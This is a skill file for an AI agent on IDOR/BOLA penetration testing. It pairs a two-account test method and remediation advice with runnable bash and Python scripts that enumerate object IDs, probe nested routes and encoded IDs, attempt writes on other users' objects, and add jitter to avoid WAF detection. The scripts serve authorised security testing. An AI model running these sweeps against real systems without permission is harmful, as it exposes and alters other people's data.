---
name: attack-idor-automation
description: "IDOR discovery and systematic cross-account testing — identifier enumeration, access-control differentials, bulk verification"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - idor
  - bola
  - access-control
  - automation
  - attack
tech_stack:
  - web
  - api
cwe_ids:
  - CWE-639
  - CWE-284
chains_with:
  - attack-jwt
  - attack-graphql
prerequisites: []
severity_boost:
  attack-jwt: "A forged identity plus IDOR = access as any user to any object"
  attack-graphql: "Aliasing plus IDOR = the entire object space in one request"
---

# IDOR Discovery and Systematic Cross-Account Testing

> **AI LOAD INSTRUCTION**: The whole discipline is one rule: **an IDOR is proven by a
> differential between two identities, and by nothing else.** A `200` on an ID you guessed is
> not a finding — it may be public data, your own object, or a coincidental route. A `200` on
> an ID you *created as a different user* is a finding, because you can show both sides.
> Build the two-account harness before you fuzz anything; automation without a verified
> baseline produces false positives at scale, and a report full of false positives destroys
> the credibility of the real ones.
>
> The second rule: **identifier quality determines severity.** Sequential integers turn one
> bug into a full-database incident; UUIDv4 keeps it targeted. State the identifier type in
> every finding — it is the difference between high and medium.

## 0. RELATED ROUTING

- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) — the long-form companion; load alongside this file
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) — the API-shaped treatment of the same class
- [attack-jwt](../attack-jwt/SKILL.md) — forging the identity the differential requires
- [attack-graphql](../attack-graphql/SKILL.md) — aliasing to sweep an ID space in one request
- [attack-idor-automation](../attack-idor-automation/SKILL.md) — this file
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — presenting the differential as proof

---

## 1. THE HARNESS — BUILD THIS FIRST

Automation is only as good as its baseline. Set up four identities before testing:

| Identity | Role | Purpose |
|---|---|---|
| **A** | standard user | owns the objects under test — the victim |
| **B** | standard user, same role | attempts access — the attacker |
| **C** | second tenant / organisation | detects cross-tenant gaps |
| **D** | admin | establishes what privileged access looks like |

**Then, for every object type:**

1. As **A**, create one object through the normal flow.
2. Record A's create request and response — **the object ID and its owner are now proven.**
3. As **A**, read it and record the baseline body.
4. As **B**, request the same ID with B's session. Record request and response.
5. As **B**, no-relationship assertion: B must have no sharing, invitation, or membership.

**Step 5 is the one people skip, and it is the one that generates false positives.** Shared
tenancy, team membership, and public objects all produce a `200` that looks like IDOR and is
not.

**Capture the differential as a signed artefact while you still have both sessions.** You
cannot reconstruct A's create response later.

---

## 2. IDENTIFIER DISCOVERY AND CLASSIFICATION

**Where identifiers live — enumerate all of these before fuzzing the path:**

| Location | Example |
|---|---|
| path segment | `/orders/123` |
| nested path | `/users/1/invoices/9` |
| query parameter | `?order_id=123` |
| request body | `{"orderId":"123"}` |
| nested JSON | `{"filter":{"userId":"1"}}` |
| header | `X-Order-Id: 123`, `X-Tenant: victim` |
| cookie | `order_ref=123` |
| GraphQL argument | `order(id:"123")` |
| multipart field | `name="order_id"` |
| encoded blob | `eyJvcmRlcl9pZCI6MTIzfQ==` |

**Decode every opaque value.** Base64, hex, and JWT-shaped strings frequently carry the tenant
or user key. A cookie decoding to `{"tenant":1,"user":5}` is an IDOR surface and one of the
most commonly missed.

**Classify the identifier — this sets the severity:**

| Type | Example | Enumerable | Realistic severity |
|---|---|---|---|
| sequential integer | `123` | trivially | **high** — mass exploitation possible |
| low-entropy short ID | `a7f3` | brute-forceable | high |
| UUIDv4 | `9f8e…` | no | medium — needs the ID from elsewhere |
| UUIDv1 (time-based) | `9f8e-1f2a-…` | partially | medium–high |
| signed/HMAC'd | `123.hmac` | no | low — designed correctly |
| hashids with a weak salt | `abc` | yes if salt is guessable | high |

**A sequential ID is the finding's severity multiplier.** Report it explicitly: "object
identifiers are sequential integers, so this reproduces against the entire object table."

**Find the real ID space.** Do not jump from `123` to `124` and stop. Characterise the range:

```bash
for id in 1 2 100 1000 99999; do
  curl -s -o /dev/null -w "$id %{http_code}\n" -H "Authorization: Bearer $TOKEN_B" \
    "https://TARGET/api/orders/$id"
done
```

The response pattern across the range tells you whether IDs are dense (a real enumeration
space) or sparse (random), and where the boundaries are.

---

## 3. THE SYSTEMATIC SWEEP

Once the harness is verified with manual tests, automate — **with a control in every run.**

```python
# Pseudocode for the correct shape. Always include a known-good and known-bad control.
A_OBJECT = "<id A created>"      # must return 200 as B  → the finding
B_OBJECT = "<id B created>"      # must return 200 as B  → proves the request works
C_OBJECT = "<id C created>"      # if 200 as B         → cross-tenant, worse
PUBLIC   = "<a public object>"   # 200 as B            → NOT a finding

for oid in candidate_ids:
    r_b = get(f"/api/orders/{oid}", token=B)      # the attack
    r_a = get(f"/api/orders/{oid}", token=A)      # owner baseline
    r_n = get(f"/api/orders/{oid}", token=None)   # unauthenticated baseline
    record(oid, r_b.status, r_b.body, r_a.status, r_n.status)
```

**Run the controls in every batch:**

| Control | Expected | If it differs |
|---|---|---|
| B reads B's own object | `200` | the request shape is wrong — stop |
| B reads A's object | `200` along with the finding | **the IDOR** |
| B reads a truly public object | `200` | exclude public IDs from findings |
| unauthenticated read | `403`/`401` | confirm the boundary exists at all |
| A reads A's object | `200` | the baseline body for the diff |

**How to interpret the status matrix — this is the actual skill:**

| B's status | A's status | Verdict |
|---|---|---|
| `200` | `200` | **IDOR** if B has no relationship; else shared access |
| `200` | `200`, body filtered | partial IDOR — note the filtered fields |
| `403` | `200` | enforced — not a finding |
| `404` | `200` | enforced with existence-hiding — correct behaviour |
| `500` | `200` | error-path authz failure — medium, note it |
| `200` | `404` | **A cannot read A's object** — your harness is wrong; re-verify |

**That last row is a real trap.** If A cannot read A's own object, your sessions or IDs are
mismatched, and every result in the batch is unreliable.

**Rate and throttle deliberately.** An unthrottled sweep against production is a denial-of-
service and an intrusion-detection event. Add a delay, cap concurrency, and stop on the first
`429` or block.

---

## 4. METHOD AND ROUTE VARIATION

The read path is tested by everyone. The gap is usually elsewhere.

**Verbs — test every one, on every object:**

```
GET    /api/orders/123     → often enforced
PUT    /api/orders/123     → frequently not   ← integrity loss
PATCH  /api/orders/123     → frequently not   ← integrity loss
DELETE /api/orders/123     → frequently not   ← destructive
POST   /api/orders         → creation, sometimes for another user
OPTIONS /api/orders/123    → the allowlist; free intel
```

**A confirmed cross-tenant `DELETE` or `PUT` is critical, not high** — it is integrity loss,
not just confidentiality.

**Route-shape variations that reach different authorization code:**

```
/api/orders/123        → standard
/api/orders/123/       → trailing slash, different proxy rule
/api/Orders/123        → case variation
/api/v1/orders/123     → check every version; old ones predate the fix
/api/mobile/orders/123 → mobile API, often weaker
/api/internal/orders/123
```

**Test the same object across every API version you found.** A BOLA patched in `/api/v2/` is
regularly still live in `/api/v1/`. This is a mechanical check that produces critical findings
with high frequency.

**Nested resources are the most productive single target.** The parent check is present; the
child check is missing:

```
/api/users/1/invoices/9      ← change the child, keep the parent
/api/users/1/invoices/10
/api/orgs/2/users/1/keys/3
```

---

## 5. FROM A SINGLE HIT TO A SCALE ESTIMATE

A single confirmed IDOR is a finding. Demonstrating scale is what makes it critical — and it
must be done carefully.

**Establish the reachable range without harvesting:**

| Evidence | Method |
|---|---|
| ID density | sample 20 IDs across the range; count how many return `200` |
| boundary | find the minimum and maximum valid ID |
| growth rate | compare an old ID's creation date with a new one |
| total count | often exposed in a paginated response's `total` field |
| ordering | whether IDs map to creation time (sequential) or are random |

**Do NOT bulk-harvest user data to prove scale.** Prove the *opportunity* — "identifiers are
sequential integers from 1 to at least 4,000,000; a sample of 20 returned 18 valid objects, so
the vulnerable surface is the entire order table." That is sufficient, ethical, and defensible.

**Stop at the proof.** Retrieving ten thousand real customers' records is not a better finding
than retrieving three — it is an incident.

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Cross-tenant read of another organisation's object | **Critical (P1)** | two tenants, the differential |
| Cross-user write/delete of another user's object | **Critical (P1)** | the successful mutation and its effect |
| Cross-user read, sequential IDs | **High (P2)** | the differential plus the identifier class |
| Cross-user read, UUID IDs | **Medium (P3)** | the differential; note the reduced reach |
| Partial object exposure (field-filtered) | **Medium (P3)** | the differential and which fields leaked |
| Error-path authz failure (`500` instead of `403`) | **Medium (P3)** | the error and any leaked data |
| Unauthenticated read of user data | **High (P2)** | the no-auth request and the body |
| A `200` on a public or shared object | **Not a finding** | verify the object's visibility first |

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| **A's create request and response** | proves A owns the object and gives the ID |
| **A's read response** | the baseline body |
| **B's request**, full headers including B's token | proves B is a different, same-role identity |
| **B's response**, status and body | the authorization failure |
| **annotated diff of A's and B's reads** | the single most convincing artefact |
| proof B has no relationship to the object | rules out sharing — the top false-positive source |
| the identifier's type and enumerability | converts one hit into a severity |
| the reachable ID range and sample results | establishes scale without harvesting |
| the verb that failed (GET/PUT/DELETE) | read vs write vs destructive |
| a **negative control** object that correctly returns `403` | proves you can detect enforcement |

**The diff is the finding.** Two response bodies, identical except for the credential used,
is unarguable. A screenshot of a `200` is not.

**False positives to exclude:**

| Looks like an IDOR | Actually |
|---|---|
| A and B are in the same organisation by design | shared tenancy |
| the object is explicitly public or shareable | intended access |
| B created the object earlier in the session | state confusion — re-read A's create response |
| B *is* A (reused session) | wrong session |
| the "object" is public reference data | not a user object |
| `200` with an error body | check the body, not the status |
| the ID belongs to a deleted-then-recreated object | verify ownership at test time |

---

## 8. REMEDIATION REFERENCE

1. **Authorize the object, not the route** — resolve the object, then verify the authenticated subject owns it or holds an explicit grant. Never infer ownership from a user-scoped URL shape.
2. **Centralize the check in the data layer** — an ORM scope, a policy engine (OPA, Casbin), or framework policies applied by default. Per-handler checks are why gaps appear; each new endpoint becomes a coin flip.
3. **Apply the check to children, not only parents** — nested resources need their own ownership verification; a validated parent does not validate the child.
4. **Allowlist verbs per route** — return `405` for undefined methods. Method confusion disappears when undefined verbs cannot reach a handler.
5. **Use non-enumerable identifiers externally** — UUIDv4 or a signed identifier. Sequential integers turn a single bug into a full-database incident.
6. **Test every version, and retire old ones** — deprecate with `410 Gone`; a route that still resolves still has its old bugs.
7. **Rate-limit and alert on cross-object access** — an authenticated subject requesting objects outside their scope is high-signal and almost never legitimate. This is the detection that catches an active exploiter.
8. **Add a two-account differential test to CI** — automated cross-account checks against `PUT`/`PATCH`/`DELETE` on the top ten object types catch regressions that unit tests never see.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did you read **another user's object** with your own token? | the authorization defect |
| 2 | Was there a **control** - your own object with the same token, which works? | the check exists and you bypassed it |
| 3 | Was there a **second control** - no token at all, which is rejected? | authentication is enforced |
| 4 | Did you confirm the object **belongs to someone else**, not merely that it exists? | an existence oracle is not a leak |
| 5 | Did the same defect hold for **write, delete, and the nested collections**? | the full blast radius |
| 6 | Did the enumeration use **a real id range**, not random ids that all 404? | coverage |
| 7 | Did you **not modify or delete** another user's object? | engagement integrity |

**Another user's data returned to your token, with both controls, is the bar.** A `200` for an id that
does not exist is an existence oracle; the other user's data is the finding.

---

## 10. EXECUTION PRIMITIVES

IDOR automation is proven by **a sweep that returns other users' objects, with the own-object and
no-credential controls, and a rate you report honestly**. Every block ends at another user's record.

### 10.1 The three controls, before any sweep

```bash
T="https://api.target.example"; MINE="AUTH_TOKEN_A"; OTHER="AUTH_TOKEN_B"
OBJ_MINE=1001; OBJ_OTHER=1002
# CONTROL 1: my object with my token, which must work
curl -sS -o /tmp/c1.json -w 'own+own      %{http_code}\n' -H "Authorization: Bearer $MINE" "$T/api/users/$OBJ_MINE"
# CONTROL 2: no credential, which must be rejected
curl -sS -o /dev/null -w 'no-cred      %{http_code}\n' "$T/api/users/$OBJ_MINE"
# CONTROL 3: B's token on B's object, which must also work - proves the object exists and belongs to B
curl -sS -o /tmp/c3.json -w 'other+other  %{http_code}\n' -H "Authorization: Bearer $OTHER" "$T/api/users/$OBJ_OTHER"
# THE TEST: my token on B's object
curl -sS -o /tmp/t1.json -w 'own+other    %{http_code}\n' -H "Authorization: Bearer $MINE" "$T/api/users/$OBJ_OTHER"
echo "--- compare the bodies: the test body must equal control 3's body, not control 1's"
diff <(python3 -c "import json;print(json.dumps(json.load(open('/tmp/c3.json')),sort_keys=True))" 2>/dev/null) \
     <(python3 -c "import json;print(json.dumps(json.load(open('/tmp/t1.json')),sort_keys=True))" 2>/dev/null) \
  && echo "IDENTICAL -> the finding is proven" || echo "different -> inspect manually"
```

**The B-on-B control is the crucial one.** It proves the object exists and belongs to another user, which
is what separates a leak from an existence oracle.

### 10.2 The enumeration, with a 404 baseline

```python
# the sweep: report the rate honestly, and never claim an id is "exposed" if it simply does not exist
import requests, statistics, time
T = "https://api.target.example"
AUTH = {"Authorization": "Bearer TOKEN_A"}
MINE = "1001"

def get(oid, auth=True):
    try:
        r = requests.get(f"{T}/api/users/{oid}", headers=AUTH if auth else {}, timeout=10)
        return r.status_code, len(r.content), r.text[:80]
    except Exception as e:
        return "ERR", 0, type(e).__name__

# STEP 1 - find an id that does NOT exist: the 404 baseline
nonexistent = None
for oid in ["999999999", "zzzz-not-an-id", "-1"]:
    st, n, _ = get(oid)
    if st == 404:
        nonexistent = oid; break
print("404 baseline id:", nonexistent, "-> status", get(nonexistent)[0] if nonexistent else "?")

# STEP 2 - the sweep, with the 404 baseline shown side by side
print()
print("%-12s %-6s %-8s %s" % ("id", "code", "bytes", "body-head"))
rows = []
for oid in [MINE, "1002", "1003", "1004", "1005", nonexistent]:
    st, n, body = get(oid)
    verdict = ""
    if st == 200 and oid != MINE: verdict = "  <-- OTHER USER"
    elif st == 200: verdict = "  (own object, control)"
    elif st == 404: verdict = "  (404 baseline)"
    print("%-12s %-6s %-8s %s%s" % (oid, st, n, body.replace("\n"," "), verdict))

print()
print("REPORT THE RATE: 'N of M ids tested returned objects belonging to other accounts'.")
print("An id returning the SAME 404 body as the baseline is NOT exposed. Exclude it.")
```

**The 404 baseline is what makes the rate honest.** Reporting "5000 ids exposed" when 4900 were 404s is
the standard failure of this family, and the baseline row is the remedy.

### 10.3 The id forms that a naive filter misses

```python
# real deployments use UUIDs, slugs, composites, and encoded ids - test each form
FORMS = {
 "integer":        ["1002", "1003"],
 "zero-padded":    ["01002", "01003"],
 "uuid":           ["3fa85f64-5717-4562-b3fc-2c963f66afa6"],
 "base64-json":    ["eyJpZCI6MTAwMn0="],            # {"id":1002}
 "gid-encoded":    ["gid://app/User/1002"],
 "composite":      ["1002:profile"],
 "negative":       ["-1002"],
 "float":          ["1002.0"],
 "array":          ["1002,1003"],
 "wildcard":       ["*"],
 "null":           ["null"],
}
print("test each FORM, because the parsing differs and one may bypass the check entirely:")
for form, vals in FORMS.items():
    print(f"  {form:14} {vals}")
print()
print("ALSO: the ENCODED forms, which defeat a comparison done on the raw string")
for v in ["1002", "%31%30%30%32", "1%30002", "1002%00", " 1002 ", "1002%20", "١٠٠٢"]:
    print("  ", v)
print()
print("AND the nested/related paths, which frequently have NO check at all:")
for p in ["/api/users/1002/orders", "/api/orders?user_id=1002", "/api/users/1002/settings",
          "/api/messages?to=1002", "/api/files/1002/download"]:
    print("  ", p)
```

**The nested paths frequently lack the check the parent has.** `/api/users/1002/orders` is often
unprotected where `/api/users/1002` is protected, and the report should list which paths you tested.

### 10.4 The write and delete tests

```python
# a read leak is one severity; a write on another user's object is another. Test each, carefully.
import requests
T = "https://api.target.example"; A = {"Authorization": "Bearer TOKEN_A"}
OBJECTS = ["1002", "1003"]

print("ORDER OF TESTING (least destructive first):")
print("  1. PATCH with a no-op value you can reverse, and a verification read")
print("  2. PUT of the full object as it was, which proves the check without changing anything")
print("  3. DELETE only with written authorization, on a disposable object")
print()
print("THE VERIFICATION PATTERN for a write:")
print("""  before = GET /api/users/1002                  # may already be forbidden
  r      = PATCH /api/users/1002 {"display_name": "idor-probe"}
  after  = GET /api/users/1002                  # the change is visible with MY token
  r2     = PATCH /api/users/1002 {"display_name": before_value}   # REVERSE IT
  verify = GET /api/users/1002                  # confirm the reversal""")
print()
print("THE CONTROL: the identical PATCH against YOUR OWN id, which must succeed.")
print("A PATCH of another user's object that SUCCEEDS while the own-object write also succeeds,")
print("and the object is restored afterwards, is the finding.")
print()
print("NEVER run the DELETE test without written authorisation. Record the request you did NOT make.")
```

**Writes need a reversal and a control.** The own-object write control plus the reversal is what makes a
write finding defensible.

### 10.5 The rate-limit and WAF interaction

```python
# the sweep must not look like an attack to a WAF, and the rate must be honest
import requests, time, random
T = "https://api.target.example"; A = {"Authorization": "Bearer TOKEN_A"}

def sweep(ids, delay=0.35, jitter=0.25):
    hits, blocked, errors = [], 0, 0
    for oid in ids:
        try:
            r = requests.get(f"{T}/api/users/{oid}", headers=A, timeout=10)
            if r.status_code == 429: blocked += 1
            elif r.status_code == 200: hits.append(oid)
        except Exception: errors += 1
        time.sleep(delay + random.uniform(0, jitter))
    return hits, blocked, errors

ids = [str(i) for i in range(1000, 1060)]
hits, blocked, errors = sweep(ids)
print(f"tested {len(ids)}  hits {len(hits)}  rate-limited {blocked}  errors {errors}")
print(f"HIT RATE: {100*len(hits)/max(1,len(ids)-blocked):.0f}% of non-rate-limited requests")
print("hits:", hits[:20])
print()
print("REPORT: the tested count, the hit count, the rate-limited count, and the 404 baseline.")
print("A rate limit is itself worth noting, and 429s must be excluded from the denominator.")
```

**Exclude 429s from the denominator and report them.** A rate that includes rate-limited attempts is
wrong, and the report should say the sweep was throttled.

### 10.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, json, time
T = "https://api.target.example"
A = {"Authorization": "Bearer TOKEN_A"}
B = {"Authorization": "Bearer TOKEN_B"}

print("=== CONTROLS ===")
for name, hdr, oid in [("own+own", A, "1001"), ("no-cred", {}, "1001"),
                       ("other+other", B, "1002"), ("other+own", B, "1001")]:
    r = requests.get(f"{T}/api/users/{oid}", headers=hdr, timeout=10)
    print("  %-14s %-6s %s" % (name, r.status_code, r.text[:70].replace("\n"," ")))

print()
print("=== TEST ===")
r = requests.get(f"{T}/api/users/1002", headers=A, timeout=10)
print("  own-token -> other object:", r.status_code, r.text[:120].replace("\n"," "))
leak = r.status_code == 200 and "@" in r.text
print("  verdict:", "UNAUTHORISED READ (finding)" if leak else "not a leak - check the body")

print()
print("=== NESTED PATHS (often unchecked) ===")
for p in ["/api/users/1002/orders", "/api/orders?user_id=1002", "/api/users/1002/settings"]:
    try:
        r = requests.get(f"{T}{p}", headers=A, timeout=10)
        print("  %-32s %-6s %s" % (p, r.status_code, r.text[:80].replace("\n"," ")))
    except Exception as e:
        print("  %-32s ERR %s" % (p, type(e).__name__))

print()
print("=== 404 BASELINE (for an honest rate) ===")
r = requests.get(f"{T}/api/users/999999999", headers=A, timeout=10)
print("  nonexistent id:", r.status_code, r.text[:60].replace("\n"," "))
print()
print("FINDING = another user's data with both controls, at a rate you report with its denominator.")
PY
```

**Controls, the leak, the nested paths, and the 404 baseline.** The rate without its denominator is not a
rate, and the nested paths are where the coverage gaps hide.

---

## 11. EVIDENCE STANDARD — IDOR ARTEFACTS

| Item | Why |
|---|---|
| The **own-object control** with your token | proves the endpoint works and the object model is as expected |
| The **no-credential control** | proves authentication is enforced |
| The **B-on-B control** | proves the other object exists and belongs to another user |
| The **test request returning the other user's data** | the finding |
| The **body comparison** (test == B-on-B, not == own) | the same object, reached with the wrong authority |
| The **404 baseline row** and the **tested/hit/rate-limited counts** | the honest rate |
| The **id forms tested**, and the nested paths tested | the coverage claim |
| Any **write or delete** performed, with its verification and its reversal | the write severity and the cleanup |
| Whether the response **leaks more than the object** (nested PII, internal ids) | the severity |
| Confirmation that **no object was left modified or deleted** | engagement integrity |

Report the **leak and the controls**: "`GET /api/users/1001` with token A returns my own record, which is
the own-object control; the same request with no token returns `401`, which is the authentication control;
and `GET /api/users/1002` with token B returns the record that token A also receives, which establishes
that the object belongs to another account. `GET /api/users/1002` with token A returns the same JSON,
including the account's email and internal notes, which is the finding. The nested path
`GET /api/users/1002/orders` with token A also returns that account's orders, so the check is missing
from both routes. Of 60 consecutive ids tested at 0.35-second intervals, 41 returned `200` and 19 returned
the same `404` body as the nonexistent-id baseline; 3 requests were rate-limited with `429` and are
excluded from the rate", never "the API is vulnerable to IDOR".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `200` for an id with **the same body as the 404 baseline** | the endpoint returns 200 for everything; nothing leaked |
| A `200` on a **public** profile endpoint | designed to be public; check the field sensitivity |
| A **random id that happens to exist** and is yours | verify ownership before claiming a leak |
| A response that **differs** from the own-object body in a trivial field only | inspect: it may be your own object with an updated timestamp |
| An id **you guessed with admin credentials** | you hold the privilege |
| A finding where the ids were **enumerated from a public list** | the ids were already public; the leak is the access |
| A **POST-only** endpoint's GET returning the form | not a record |
| A rate that **includes 429s** in the denominator | an inflated rate; correct it |
| A rate reported **without the tested count** | not a rate |
| A **write** performed without authorisation and without a reversal | an incident you caused |
| A finding on a **staging host with public test data** | verify the deployment and the data's sensitivity |

**Another user's data, with all three controls and an honest rate.** This family's non-findings are almost
all 200-for-everything endpoints and rates without denominators.

---

## 12. REMEDIATION REFERENCE — OBJECT AUTHORIZATION HARDENING

1. **Authorize on the object's owner or the caller's role for every request, at the data layer, using the authenticated principal rather than an id from the request** - it removes the entire class, and the id from the request must never be the authority.
2. **Scope every query by the owner: `WHERE user_id = :principal AND id = :requested`, so a wrong id returns nothing** - it makes the check structural rather than a separate branch that can be forgotten.
3. **Apply the same check to nested and related routes; a sub-resource is a separate endpoint with its own authorization** - `/users/{id}/orders` is the most common gap.
4. **Return `404` rather than `403` for an object the caller cannot see, so the API does not become an existence oracle** - it removes the enumeration signal.
5. **Use unguessable identifiers (UUIDv4 or a random token) as a defence in depth, but never as the only control** - obscurity is not authorization, and it must be combined with the owner check.
6. **Centralize the authorization check in a middleware or a policy layer, and require a new route to opt in explicitly rather than opt out** - the regression is always a route that forgot.
7. **Test every route with two accounts in CI: a request with account A's token for account B's object must fail, and the test must run on every build** - it is mechanical and it catches the regressions this family always produces.
8. **Log the principal and the requested object id for every authorization decision, and alert on a burst of 404s from one principal** - the sweep in 10.5 has a distinctive signature.
9. **Rate-limit per principal and per endpoint, and add a lockout after a threshold of failed object fetches** - it makes the enumeration expensive rather than trivial.
10. **Review the response serializers so a permitted object does not carry another object's nested data** - the leak is frequently in an included relation rather than the top-level record.
11. **Audit every new endpoint for the authorization decision as part of the review, and record the decision in the route definition** - the only durable fix is making the check impossible to omit.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - the full technique reference
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the API-level object authorization context
- [attack-graphql](../attack-graphql/SKILL.md) - the same defect in a single-endpoint API
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) - the route discovery that supplies the id surface
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) - the flow-level defects an id swap frequently triggers
